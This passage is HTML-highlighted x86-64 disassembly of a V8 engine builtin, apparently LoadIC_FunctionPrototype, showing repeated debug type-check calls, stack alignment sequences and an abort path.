class="number">0x7fdaddcceed6</span>    <span class="number">76</span>  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddcceed9</span>    <span class="number">79</span>  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddcceedd</span>    <span class="number">7</span>d  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddcceee1</span>    <span class="number">81</span>  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddcceee5</span>    <span class="number">85</span>  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddcceeec</span>    <span class="number">8</span>c  <span class="number">8b</span>92fb090000   movl rdx,[rdx+<span class="number">0x9fb</span>]</span><br><span class="line"><span class="number">0x7fdaddcceef2</span>    <span class="number">92</span>  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddcceef5</span>    <span class="number">95</span>  bec8000000     movl rsi,<span class="number">0xc8</span></span><br><span class="line"><span class="number">0x7fdaddcceefa</span>    <span class="number">9</span>a  <span class="number">488b</span>7de8       REX.W movq rdi,[rbp<span class="number">-0x18</span>]</span><br><span class="line"><span class="number">0x7fdaddcceefe</span>    <span class="number">9</span>e  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddccef05</span>    a5  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddccef09</span>    a9  <span class="number">7401</span>           jz <span class="number">0x7fdaddccef0c</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccef0b</span>    ab  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccef0c</span>    ac  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccef13</span>    b3  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddccef17</span>    b7  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddccef1b</span>    bb  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddccef1d</span>    bd  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span class="number">0x7fdaddccef25</span>    c5  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span class="number">0x7fdaddccef29</span>    c9  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddccef2c</span>    cc  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddccef30</span>    d0  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddccef34</span>    d4  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddccef38</span>    d8  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccef3f</span>    df  <span class="number">8b</span>92ff090000   movl rdx,[rdx+<span class="number">0x9ff</span>]</span><br><span class="line"><span class="number">0x7fdaddccef45</span>    e5  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccef48</span>    e8  be02000000     movl rsi,<span class="number">0x2</span></span><br><span class="line"><span class="number">0x7fdaddccef4d</span>    ed  <span class="number">488b</span>7de0       REX.W movq rdi,[rbp<span class="number">-0x20</span>]</span><br><span class="line"><span class="number">0x7fdaddccef51</span>    f1  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddccef58</span>    f8  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddccef5c</span>    fc  <span class="number">7401</span>           jz <span class="number">0x7fdaddccef5f</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccef5e</span>    fe  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccef5f</span>    ff  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccef66</span>   <span class="number">106</span>  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddccef6a</span>   <span class="number">10</span>a  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddccef6e</span>   <span class="number">10</span>e  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddccef70</span>   <span class="number">110</span>  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span class="number">0x7fdaddccef78</span>   <span class="number">118</span>  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span class="number">0x7fdaddccef7c</span>   <span class="number">11</span>c  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddccef7f</span>   <span class="number">11f</span>  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddccef83</span>   <span class="number">123</span>  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddccef87</span>   <span class="number">127</span>  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddccef8b</span>   <span class="number">12b</span>  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccef92</span>   <span class="number">132</span>  <span class="number">8b</span>92030a0000   movl rdx,[rdx+<span class="number">0xa03</span>]</span><br><span class="line"><span class="number">0x7fdaddccef98</span>   <span class="number">138</span>  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccef9b</span>   <span class="number">13b</span>  be50000000     movl rsi,<span class="number">0x50</span></span><br><span class="line"><span class="number">0x7fdaddccefa0</span>   <span class="number">140</span>  <span class="number">488b</span>7dd8       REX.W movq rdi,[rbp<span class="number">-0x28</span>]</span><br><span class="line"><span class="number">0x7fdaddccefa4</span>   <span class="number">144</span>  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddccefab</span>   <span class="number">14b</span>  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddccefaf</span>   <span class="number">14f</span>  <span class="number">7401</span>           jz <span class="number">0x7fdaddccefb2</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccefb1</span>   <span class="number">151</span>  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccefb2</span>   <span class="number">152</span>  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccefb9</span>   <span class="number">159</span>  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddccefbd</span>   <span class="number">15</span>d  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddccefc1</span>   <span class="number">161</span>  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddccefc3</span>   <span class="number">163</span>  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span class="number">0x7fdaddccefcb</span>   <span class="number">16b</span>  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span class="number">0x7fdaddccefcf</span>   <span class="number">16f</span>  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddccefd2</span>   <span class="number">172</span>  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddccefd6</span>   <span class="number">176</span>  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddccefda</span>   <span class="number">17</span>a  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddccefde</span>   <span class="number">17</span>e  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccefe5</span>   <span class="number">185</span>  <span class="number">8b</span>92070a0000   movl rdx,[rdx+<span class="number">0xa07</span>]</span><br><span class="line"><span class="number">0x7fdaddccefeb</span>   <span class="number">18b</span>  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccefee</span>   <span class="number">18</span>e  be40010000     movl rsi,<span class="number">0x140</span></span><br><span class="line"><span class="number">0x7fdaddcceff3</span>   <span class="number">193</span>  <span class="number">488b</span>7dd0       REX.W movq rdi,[rbp<span class="number">-0x30</span>]</span><br><span class="line"><span class="number">0x7fdaddcceff7</span>   <span class="number">197</span>  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddcceffe</span>   <span class="number">19</span>e  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddccf002</span>   <span class="number">1</span>a2  <span class="number">7401</span>           jz <span class="number">0x7fdaddccf005</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf004</span>   <span class="number">1</span>a4  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf005</span>   <span class="number">1</span>a5  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccf00c</span>   <span class="number">1</span>ac  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddccf010</span>   <span class="number">1b</span>0  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddccf014</span>   <span class="number">1b</span>4  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddccf016</span>   <span class="number">1b</span>6  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span class="number">0x7fdaddccf01e</span>   <span class="number">1b</span>e  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span class="number">0x7fdaddccf022</span>   <span class="number">1</span>c2  <span class="number">488b</span>4df0       REX.W movq rcx,[rbp<span class="number">-0x10</span>]</span><br><span class="line"><span class="number">0x7fdaddccf026</span>   <span class="number">1</span>c6  <span class="number">8b</span>79ff         movl rdi,[rcx<span class="number">-0x1</span>]</span><br><span class="line"><span class="number">0x7fdaddccf029</span>   <span class="number">1</span>c9  <span class="number">4903f</span>d         REX.W addq rdi,r13</span><br><span class="line"><span class="number">0x7fdaddccf02c</span>   <span class="number">1</span>cc  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddccf02f</span>   <span class="number">1</span>cf  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddccf033</span>   <span class="number">1</span>d3  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddccf037</span>   <span class="number">1</span>d7  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddccf03b</span>   <span class="number">1</span>db  <span class="number">48897</span>dc0       REX.W movq [rbp<span class="number">-0x40</span>],rdi</span><br><span class="line"><span class="number">0x7fdaddccf03f</span>   <span class="number">1</span>df  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccf046</span>   <span class="number">1e6</span>  <span class="number">8b</span>523f         movl rdx,[rdx+<span class="number">0x3f</span>]</span><br><span class="line"><span class="number">0x7fdaddccf049</span>   <span class="number">1e9</span>  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccf04c</span>   <span class="number">1</span>ec  bec0000000     movl rsi,<span class="number">0xc0</span></span><br><span class="line"><span class="number">0x7fdaddccf051</span>   <span class="number">1f</span>1  <span class="number">4</span>c8bc7         REX.W movq r8,rdi</span><br><span class="line"><span class="number">0x7fdaddccf054</span>   <span class="number">1f</span>4  <span class="number">4</span>c8bca         REX.W movq r9,rdx</span><br><span class="line"><span class="number">0x7fdaddccf057</span>   <span class="number">1f</span>7  <span class="number">4</span>c8bde         REX.W movq r11,rsi</span><br><span class="line"><span class="number">0x7fdaddccf05a</span>   <span class="number">1f</span>a  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddccf061</span>   <span class="number">201</span>  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddccf065</span>   <span class="number">205</span>  <span class="number">7401</span>           jz <span class="number">0x7fdaddccf068</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf067</span>   <span class="number">207</span>  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf068</span>   <span class="number">208</span>  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccf06f</span>   <span class="number">20f</span>  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddccf073</span>   <span class="number">213</span>  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddccf077</span>   <span class="number">217</span>  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddccf079</span>   <span class="number">219</span>  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span class="number">0x7fdaddccf081</span>   <span class="number">221</span>  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span class="number">0x7fdaddccf085</span>   <span class="number">225</span>  <span class="number">488b</span>7dc0       REX.W movq rdi,[rbp<span class="number">-0x40</span>]</span><br><span class="line"><span class="number">0x7fdaddccf089</span>   <span class="number">229</span>  <span class="number">0f</span>b64f09       movzxbl rcx,[rdi+<span class="number">0x9</span>]</span><br><span class="line"><span class="number">0x7fdaddccf08d</span>   <span class="number">22</span>d  <span class="number">49b</span>a0000000001000000 REX.W movq r10,<span class="number">0x100000000</span></span><br><span class="line"><span class="number">0x7fdaddccf097</span>   <span class="number">237</span>  <span class="number">4</span>c3bd1         REX.W cmpq r10,rcx</span><br><span class="line"><span class="number">0x7fdaddccf09a</span>   <span class="number">23</span>a  <span class="number">770</span>a           ja <span class="number">0x7fdaddccf0a6</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf09c</span>   <span class="number">23</span>c  <span class="number">33</span>d2           xorl rdx,rdx</span><br><span class="line"><span class="number">0x7fdaddccf09e</span>   <span class="number">23</span>e  b202           movb dl,<span class="number">2</span></span><br><span class="line"><span class="number">0x7fdaddccf0a0</span>   <span class="number">240</span>  e85bc70c00     call <span class="number">0x7fdaddd9b800</span>  (Abort)</span><br><span class="line"><span class="number">0x7fdaddccf0a5</span>   <span class="number">245</span>  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf0a6</span>   <span class="number">246</span>  <span class="number">48894</span>dc8       REX.W movq [rbp<span class="number">-0x38</span>],rcx</span><br><span class="line"><span class="number">0x7fdaddccf0aa</span>   <span class="number">24</span>a  f6c180         testb rcx,<span class="number">0x80</span></span><br><span class="line"><span class="number">0x7fdaddccf0ad</span>   <span class="number">24</span>d  <span class="number">0f</span>84ef010000   jz <span class="number">0x7fdaddccf2a2</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf0b3</span>   <span class="number">253</span>  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddccf0b6</span>   <span class="number">256</span>  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddccf0ba</span>   <span class="number">25</span>a  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddccf0be</span>   <span class="number">25</span>e  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddccf0c2</span>   <span class="number">262</span>  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccf0c9</span>   <span class="number">269</span>  <span class="number">8b</span>523f         movl rdx,[rdx+<span class="number">0x3f</span>]</span><br><span class="line"><span class="number">0x7fdaddccf0cc</span>   <span class="number">26</span>c  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccf0cf</span>   <span class="number">26f</span>  bec0000000     movl rsi,<span class="number">0xc0</span></span><br><span class="line"><span class="number">0x7fdaddccf0d4</span>   <span class="number">274</span>  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddccf0db</span>   <span class="number">27b</span>  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddccf0df</span>   <span class="number">27f</span>  <span class="number">7401</span>           jz <span class="number">0x7fdaddccf0e2</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf0e1</span>   <span class="number">281</span>  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf0e2</span>   <span class="number">282</span>  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccf0e9</span>   <span class="number">289</span>  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddccf0ed</span>   <span class="number">28</span>d  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddccf0f1</span>   <span class="number">291</span>  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddccf0f3</span>   <span class="number">293</span>  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span class="number">0x7fdaddccf0fb</span>   <span class="number">29b</span>  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span class="number">0x7fdaddccf0ff</span>   <span class="number">29f</span>  f645c801       testb [rbp<span class="number">-0x38</span>],<span class="number">0x1</span></span><br><span class="line"><span class="number">0x7fdaddccf103</span>   <span class="number">2</span>a3  <span class="number">0f</span>85b0010000   jnz <span class="number">0x7fdaddccf2b9</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf109</span>   <span class="number">2</span>a9  <span class="number">488b</span>4df0       REX.W movq rcx,[rbp<span class="number">-0x10</span>]</span><br><span class="line"><span class="number">0x7fdaddccf10d</span>   <span class="number">2</span>ad  <span class="number">8b</span>791b         movl rdi,[rcx+<span class="number">0x1b</span>]</span><br><span class="line"><span class="number">0x7fdaddccf110</span>   <span class="number">2b</span>0  <span class="number">4903f</span>d         REX.W addq rdi,r13</span><br><span class="line"><span class="number">0x7fdaddccf113</span>   <span class="number">2b</span>3  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddccf116</span>   <span class="number">2b</span>6  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddccf11a</span>   <span class="number">2b</span>a  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddccf11e</span>   <span class="number">2b</span>e  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddccf122</span>   <span class="number">2</span>c2  <span class="number">48897</span>dc8       REX.W movq [rbp<span class="number">-0x38</span>],rdi</span><br><span class="line"><span class="number">0x7fdaddccf126</span>   <span class="number">2</span>c6  be06000000     movl rsi,<span class="number">0x6</span></span><br><span class="line"><span class="number">0x7fdaddccf12b</span>   <span class="number">2</span>cb  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccf132</span>   <span class="number">2</span>d2  <span class="number">8b</span>523f         movl rdx,[rdx+<span class="number">0x3f</span>]</span><br><span class="line"><span class="number">0x7fdaddccf135</span>   <span class="number">2</span>d5  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccf138</span>   <span class="number">2</span>d8  <span class="number">488b</span>c7         REX.W movq rax,rdi</span><br><span class="line"><span class="number">0x7fdaddccf13b</span>   <span class="number">2</span>db  <span class="number">4</span>c8bc6         REX.W movq r8,rsi</span><br><span class="line"><span class="number">0x7fdaddccf13e</span>   <span class="number">2</span>de  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddccf145</span>   <span class="number">2e5</span>  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddccf149</span>   <span class="number">2e9</span>  <span class="number">7401</span>           jz <span class="number">0x7fdaddccf14c</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf14b</span>   <span class="number">2</span>eb  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf14c</span>   <span class="number">2</span>ec  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccf153</span>   <span class="number">2f</span>3  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddccf157</span>   <span class="number">2f</span>7  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddccf15b</span>   <span class="number">2f</span>b  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddccf15d</span>   <span class="number">2f</span>d  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span class="number">0x7fdaddccf165</span>   <span class="number">305</span>  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span class="number">0x7fdaddccf169</span>   <span class="number">309</span>  <span class="number">488b</span>45c8       REX.W movq rax,[rbp<span class="number">-0x38</span>]</span><br><span class="line"><span class="number">0x7fdaddccf16d</span>   <span class="number">30</span>d  <span class="number">41398598000000</span> cmpl [r13+<span class="number">0x98</span>] (<span class="built_in">root</span> (the_hole_value)),rax</span><br><span class="line"><span class="number">0x7fdaddccf174</span>   <span class="number">314</span>  <span class="number">0f</span>8456010000   jz <span class="number">0x7fdaddccf2d0</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf17a</span>   <span class="number">31</span>a  <span class="number">8b</span>78ff         movl rdi,[rax<span class="number">-0x1</span>]</span><br><span class="line"><span class="number">0x7fdaddccf17d</span>   <span class="number">31</span>d  <span class="number">4903f</span>d         REX.W addq rdi,r13</span><br><span class="line"><span class="number">0x7fdaddccf180</span>   <span class="number">320</span>  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddccf183</span>   <span class="number">323</span>  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddccf187</span>   <span class="number">327</span>  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddccf18b</span>   <span class="number">32b</span>  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddccf18f</span>   <span class="number">32f</span>  <span class="number">48897</span>df0       REX.W movq [rbp<span class="number">-0x10</span>],rdi</span><br><span class="line"><span class="number">0x7fdaddccf193</span>   <span class="number">333</span>  bec0000000     movl rsi,<span class="number">0xc0</span></span><br><span class="line"><span class="number">0x7fdaddccf198</span>   <span class="number">338</span>  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccf19f</span>   <span class="number">33f</span>  <span class="number">8b</span>523f         movl rdx,[rdx+<span class="number">0x3f</span>]</span><br><span class="line"><span class="number">0x7fdaddccf1a2</span>   <span class="number">342</span>  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccf1a5</span>   <span class="number">345</span>  <span class="number">488b</span>cf         REX.W movq rcx,rdi</span><br><span class="line"><span class="number">0x7fdaddccf1a8</span>   <span class="number">348</span>  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddccf1af</span>   <span class="number">34f</span>  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddccf1b3</span>   <span class="number">353</span>  <span class="number">7401</span>           jz <span class="number">0x7fdaddccf1b6</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf1b5</span>   <span class="number">355</span>  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf1b6</span>   <span class="number">356</span>  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccf1bd</span>   <span class="number">35</span>d  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddccf1c1</span>   <span class="number">361</span>  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddccf1c5</span>   <span class="number">365</span>  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddccf1c7</span>   <span class="number">367</span>  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span 